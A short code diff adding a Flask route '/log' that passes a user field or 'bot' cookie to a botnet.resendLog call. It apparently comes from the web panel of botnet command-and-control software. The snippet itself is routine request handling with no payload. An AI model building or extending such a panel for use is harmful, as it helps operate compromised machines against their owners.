@@ -166,6 +166,16 @@ def index():
         resp.set_cookie('bot',request.form.get('bot'))
     return resp
 
+@app.route('/log', methods=['POST'])
+def resend_log():
+    if request.method == 'POST':
+        connected = ''
+        if 'user' in request.form:
+            connected = request.form.get('user')
+        elif 'bot' in request.cookies:
+            connected = request.cookies.get('bot')
+        botnet.resendLog(connected)
+    return "done"
 
 @app.route('/finder')
 @requires_auth
